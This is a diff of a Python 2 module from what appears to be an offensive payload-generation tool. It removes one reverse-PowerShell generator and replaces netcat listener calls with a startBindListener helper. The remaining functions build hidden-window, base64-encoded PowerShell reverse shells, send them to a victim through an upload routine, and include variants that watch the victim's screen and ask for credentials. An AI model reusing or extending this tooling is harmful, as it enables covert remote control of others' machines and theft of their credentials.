@@ -114,17 +114,6 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
     return True
 
 
-def reversePowerShellGeneration(payloadchoice,payloadname):
-    portnum,ipaddr = reverseIpAndPort('4444')
-
-    shellcode = payloadchoice % (ipaddr,portnum,"|%{0}")
-    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
-    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
-    checkClientUpload(payloadname,powershellExec,isExe=False)
-    os.system('nc -lvp %s'%portnum)
-    return True
-
-
 def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
 
@@ -132,8 +121,7 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
     checkClientUpload(payloadname,powershellExec,isExe=False)
-    os.system('nc -lvp %s | nc -lvp 80 &'%(portnum))
-    os.system('firefox 127.0.0.1')
+    startBindListener(int(portnum),useProxy=True)
     return True
 
 
@@ -144,5 +132,5 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
     checkClientUpload(payloadname,powershellExec,isExe=False)
-    os.system('nc -lvp %s'%(portnum))
+    startBindListener(int(portnum),useProxy=False)
     return True
